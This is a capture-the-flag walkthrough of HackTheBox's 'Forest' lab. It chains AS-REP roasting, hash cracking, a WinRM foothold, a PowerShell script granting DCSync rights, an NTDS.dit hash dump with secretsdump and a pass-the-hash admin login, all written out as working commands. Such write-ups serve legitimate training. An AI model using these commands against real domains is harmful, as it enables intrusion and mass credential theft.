## Hello everyone!

Today, we will explore “*Forest*”, a CTF from **HackTheBox**.

Without further ado, let’s get started!

![image](/HTB/Forest/Forest_images/1.png)

## Information Gathering

First, we will perform an aggressive **Nmap** scan to gather as much information as possible about the target:

![image](/HTB/Forest/Forest_images/2.png)

Multiple services are exposed. Fundamentals here are:

**DNS** (Port 53)

**Kerberos** (Port 88)

**RPC** (Port 135)

**NetBIOS** (Port 139)

**LDAP** (Port 389)

**SMB** (Port 445) 

**WinRM** (HTTP Port 5985)

It could be deduced from the port scanning that we face an Active Directory environment. The `htb.local` **AD domain** and the `FOREST` **Domain Controller** has been identified by Nmap Script Engine’s default scripts (NSE).

![image](/HTB/Forest/Forest_images/2.png)

(added in our `/etc/hosts` local file)

Since we start this box without any credentials, we could attempt to access the **SMB shares** through `smbclient` as anonymous. However, directory listing is disabled for unauthenticated users. Initial valid usernames is a need to attempt any form of attack. Attempting to use NetExec (`nxc`) to perform **RID bruteforcing** through the `—rid-brute` option in order to retrieve valid domain users through their SID entry (we will run it as the unauthenticated *Guest* user) isn’t concludent either here since the IPC share has not anonymous read permissions. However, attempting to query anonymously (with the `-x` switch) LDAP objects, several employees and a service account could be identified:

```jsx
ldapsearch -x -b "dc=htb, dc=local" "*" -H ldap://TARGET_IP | grep '^dn:'
```

![image](/HTB/Forest/Forest_images/5.png)

We could construct the following users list in order to weaponize ourselves for further **Kerberos** attacks:

![image](/HTB/Forest/Forest_images/6.png)

We now have the weapon needed to lead our Active Directory attacks, although no authenticate access is granted yet.

Since the **Kerberos authentication flow** starts from an **AS-REQ** (Request) made generally from a pre-authenticated user to the **Authentication service** (AS) in order to receive a **Ticket-Granting-Ticket** (TGT) from the **Key Distribution Center** (KDC), owned by the Domain Controller (previously identified as `FOREST.htb.local`). This step is essential for users to access a service legitimately; it is crucial from a security perspective for obvious reasons.

However, there is a flag in the **userAccountControl** attribute of an Active Directory account that, when set on an account, allows to make the KDC skip this **pre**-authentication check entirely during the AS-REQ: this flag is called `DONT_REQUIRE_PREAUTH`. If enabled, an **AS-REP** (Reply) could be obtained from the KDC, containing a **Kerberos credential** derived from the victim’s password hash that an attacker could attempt to crack offline through **Hashcat** or **John** **the** **Ripper**.

The Impacket suit contains awesome tools for AD pentesting. For this first exploitation stage, we will use **impacket-GetNPUsers**. The following command could be executed to query the KDC for domain users 

`impacket-GetNPUsers htb.local/ -no-pass -usersfile users.txt -dc-ip TARGET_IP`

![image](/HTB/Forest/Forest_images/7.png)

It appears that the `svc-alfresco` service account has the `DONT_REQUIRE_PREAUTH` flag set within the target domain: AS-REP responses have been recovered from the tool.

We could paste the extracted AS-REP Roast hashes derived from users passwords in order to attempt to perform offline cracking on them through **Hashcat**. The hash mode to provide with the `-m` switch could be identified with the `—-identify` option as below:

![image](/HTB/Forest/Forest_images/8.png)

We could then execute the following command to attempt password cracking:

`hashcat -m 18200 -a 0 svc-alfresco_hash.txt /usr/share/wordlists/rockyou.txt`

![image](/HTB/Forest/Forest_images/9.png)

We successfully cracked the service account’s password hash.

Now that we have an authenticated access within the domain, let’s use `smbmap` to list available SMB shares with their permissions as the `svc-alfresco` user:

![image](/HTB/Forest/Forest_images/10.png)

It appears that we now have read access on the `IPC$` share! Bruteforcing RID’s doesn’t reveal additional domain users. However, now we could use our authenticated access to generate a ZIP file that we could export in **BloodHound** in order to visualize **AD objects relations**.

This can be achieved through `bloodhound-python`, through the following command:

`bloodhound-python -u 'svc-alfresco' -p '<PASSWORD>' -d htb.local -ns TARGET_IP -c All --zip`

(you may need to execute `sudo ntpdate 10.129.69.212` before to avoid any timing issues)

![image](/HTB/Forest/Forest_images/11.png)

Now, we import the file in BloodHound as below:

![image](/HTB/Forest/Forest_images/12.png)

Once file ingest completed, we could inspect objects relations in the Explore section. Inspecting relations concerning the svc-alfresco AD user object, it can be identified that the user is a member of the *Remote Management Users* privileged group, issued of the *Privileged IT Accounts* group: 

![image](/HTB/Forest/Forest_images/13.png)

Similarly to the *Remote Desktop Users* group with RDP, the Remote Management Users group allows concerned users to access a system shell remotely through **management protocols**, such as **WinRM**.

![image](/HTB/Forest/Forest_images/14.png)

Hence, we could obtain our foothold on the target system through `evil-winrm`, a tool used to initiate a shell session through the WinRM protocol.

`evil-winrm -i TARGET_ -u 'svc-alfresco' -p '<PASSWORD>'`

![image](/HTB/Forest/Forest_images/15.png)

We successfully obtained our initial access on the target machine as the svc-alfresco user, allowing us to retrieve the user flag in the `C:\Users\svc-alfresco\Desktop` user’s desktop directory.

![image](/HTB/Forest/Forest_images/16.png)

## Privilege Escalation

Checking for user’s local privilege through `whoami /priv` doesn’t reveal any critical configuration.

![image](/HTB/Forest/Forest_images/17.png)

Inspecting the `C:\Users` directory, we could observe that the `sebastien` domain user previously identified as a local session on the machine:

![image](/HTB/Forest/Forest_images/18.png)

We could remember that the user we compromised is a member of the **Account Operators** group too. Members of this group can create and modify most types of accounts, including accounts for users, Local groups, and Global groups. 

Moreover, *Account Operators* members can modify user objects for any user that is not a member of one of the protected groups (Administrators, Server Operators, Account Operators, Backup Operators, or Print Operators groups). Inspecting Sebastien’s nodes in BloodHound, we could confirm that a password reset would be possible, but since this user is not a member of any privileged group and does not have any interesting ACL within the domain, this would not be useful for our vertical privilege escalation and full domain compromise.

![image](/HTB/Forest/Forest_images/20.png)

![image](/HTB/Forest/Forest_images/21.png)

But that’s not all. this group is highly privileged because it allows group members to add themselves into another domain group, a very interesting feature.

 For example, getting back to BloodHound, we could observe that the **Exchange Windows Permissions** group has the **WriteDACL** ACL permission **over the domain**.

![image](/HTB/Forest/Forest_images/19.png)

WriteDACL permissions allows to make **DACL modification** on the targeted object. Getting this node with a domain user is interesting, because it could allows to enable required rights for performing a password reset attack. But given that, here, the group has this special permission at the root of the domain (domain object), attackers could abuse this permission to grant themselves ACE needed to perform **DCSync** **privileges** (allowing to replicate sensitive data, such as `Ds-Replication-Get-Changes` and Ds-`Replication-Get-Changes-All` extended rights), which is very critical from a security perspective.

Furthermore, this attack path has been determined to be a “Won’t Fix” issue by Microsoft.

Since svc-alfresco has the privilege to alter group memberships, let’s add ourselves in the 

*Exchange Windows Permissions group* in order to achieve our domain compromise.

I invite you to check this link which explains in detail the Account Operators privesc vector with its various situation cases.

This method is straightforward and consists of two steps:

Add yourself or another compromised account to the group:

`Add-ADGroupMember -Identity "Exchange Windows Permissions" -Members "svc-alfresco"`

Then, we could grant ourselves `Ds-Replication-Get-Changes` and Ds-`Replication-Get-Changes-All` extended rights:

```
$acl = get-acl "ad:DC=htb,DC=local"
$id = [Security.Principal.WindowsIdentity]::GetCurrent()
$user = Get-ADUser -Identity $id.User
$sid = new-object System.Security.Principal.SecurityIdentifier $user.SID
**# rightsGuid for the extended right Ds-Replication-Get-Changes-All**
$objectguid = new-object Guid  1131f6ad-9c07-11d1-f79f-00c04fc2dcd2
$identity = [System.Security.Principal.IdentityReference] $sid
$adRights = [System.DirectoryServices.ActiveDirectoryRights] "ExtendedRight"
$type = [System.Security.AccessControl.AccessControlType] "Allow"
$inheritanceType = [System.DirectoryServices.ActiveDirectorySecurityInheritance] "None"
$ace = new-object System.DirectoryServices.ActiveDirectoryAccessRule $identity,$adRights,$type,$objectGuid,$inheritanceType
$acl.AddAccessRule($ace)
**# rightsGuid for the extended right Ds-Replication-Get-Changes**
$objectguid = new-object Guid 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2
$ace = new-object System.DirectoryServices.ActiveDirectoryAccessRule $identity,$adRights,$type,$objectGuid,$inheritanceType
$acl.AddAccessRule($ace)
Set-acl -aclobject $acl "ad:DC=htb,DC=local"
```

Once all have been set properly,  we have to run `Set-acl -aclobject $acl "ad:DC=htb,DC=local"` in order to make the ACL modifications effective.

But before to do this, it is required to re-login in order to initiate a new evil-winrm sesion that will refresh the user SID; otherwise, access will be denied, as below.

![image](/HTB/Forest/Forest_images/22.png)

We leveraged PowerShell for this exploit, but it could also be achieved through the `impacket-dacledit` Linux tool after adding the user in the group, which can also be done through the following Living-off-the-Land command on the target machine, as a member of the *Account Operators* group: `net groups "Exchange Windows Permissions" /add svc-alfresco`, or from your Linux machine through this command: `nxc smb TARGET_IP -u 'svc-alfresco' -p '<PASSWORD>' --exec-method smbexec -x 'net group "Exchange Windows Permissions" /add svc-alfresco'` .

`impacket-dacledit` could be used as below to add the DCSync rights to the compromised user:

![image](/HTB/Forest/Forest_images/23.png)

DACL has successfully been modified, allowing the svc-alfresco user to perform privileged data replication over the domain through DRSUAPI replication protocol; `impacket-secretsdump` tool could query data replications to another DC concerning `NTDS.dit` secrets, including all domain users password hashes, resulting in a full domain compromise.

 This could be achieved through the following command:

`impacket-secretsdump 'htb.local/svc-alfresco:<PASSWORD>@forest.htb' -dc-ip 10.129.70.75 -just-dc`

Please note this method is achieved through `-just-dc` because we are querying the target Domain Controller. Without it, the tool accesses local Windows registry hives through the `WindowsRegistry` service in order to remotely retrieve local hashes stored in the *Security Account Manager* (SAM) hive by decrypting it with the local *system bootKey* extracted from the `SYSTEM` hive. 

![image](/HTB/Forest/Forest_images/miss.png)

We successfully dumped `NTDS.dit` secrets,including the `Administrator` domain admin password hash.

 At this point, the stronger password cannot resist `evil-winrm`: the tool allows to lead a Pass-the-Hash attack, which means that we don’t have to worry about password cracking, we could directly use Administrator’s NT hash to authenticate with the following command:

`evil-winrm -i TARGET_IP -u Administrator -H <NT_HASH>`

(NT hash only)

![image](/HTB/Forest/Forest_images/25.png)

Privileges have successfully been elevated to the domain admin user on the Domain Controller, resulting in a full AD domain compromise.

This could be verified through the `whoami`, `whoami` `/groups` & `hostname` commands:

![image](/HTB/Forest/Forest_images/26.png)

The root flag could be accessed in the `C:\Users\Administrator\Desktop` administrator’s desktop directory.

![image](/HTB/Forest/Forest_images/27.png)

Challenge completed!

![image](/HTB/Forest/Forest_images/28.png)

## Conclusion

We've covered a lot of concepts related to Active Directory/Kerberos attacks. From an unauthenticated LDAP objects enumeration, we extracted valid usernames that allowed us to achieve an **AS-REP** Roasting attack against the `svc-alfresco` domain account service, which led us to retrieve its password hash from the AS-REP Roast hash derived and crack it offline. We learnt from the BloodHound domain graph that the user was member of the **Remote Management Users** group, granting us our initial foothold on the target system through WinRM. 

Since this domain account was also member of the privileged **Account Operators** group, we could add ourselves in the **Windows Exchange Permission** group which has the `WriteDACL` **ACL permission** directly over the domain object, allowing us to grant ourselves **DCSync rights** (data replication permissions). We could, from there, perform **DCSync** through **DRSUAPI** and extract `NTDS.dit` domain secrets, including the domain admin password hash, which resulted in a complete compromise of the target Active Directory domain.

This challenge demonstrates how multiple low-severity vulnerabilities can be chained together to achieve a full system compromise.

**Thank you for reading!**
